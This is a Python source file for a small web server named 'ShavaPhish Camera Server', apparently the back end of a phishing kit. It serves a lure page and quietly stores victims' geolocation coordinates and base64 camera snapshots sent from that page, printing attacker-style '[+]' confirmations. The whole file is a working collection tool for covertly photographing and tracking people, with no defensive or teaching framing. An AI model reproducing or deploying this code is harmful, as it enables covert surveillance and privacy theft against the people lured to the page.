from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import os, base64, json
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

        elif self.path.startswith("/log"):
            query = parse_qs(urlparse(self.path).query)
            lat = query.get('lat', [''])[0]
            lon = query.get('lon', [''])[0]
            with open("location_log.txt", "a") as f:
                f.write(f"Latitude: {lat}, Longitude: {lon}\n")
            print(f"[+] Location Saved: {lat}, {lon}")
            self.send_response(200)
            self.end_headers()

        else:
            self.send_error(404, "Not Found")

    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            img_data = data['image'].split(",")[1]
            img_bytes = base64.b64decode(img_data)

            # Ensure photos directory exists
            os.makedirs("photos", exist_ok=True)

            filename = datetime.now().strftime("photos/%Y%m%d-%H%M%S.png")
            with open(filename, "wb") as f:
                f.write(img_bytes)

            print(f"[+] Image saved to {filename}")
            self.send_response(200)
            self.end_headers()

# Start the server
print("[*] Starting ShavaPhish Camera Server...")
server = HTTPServer(('0.0.0.0', 9090), Handler)

print("[*] ShavaPhish Camera Server running on port 9090")
server.serve_forever()

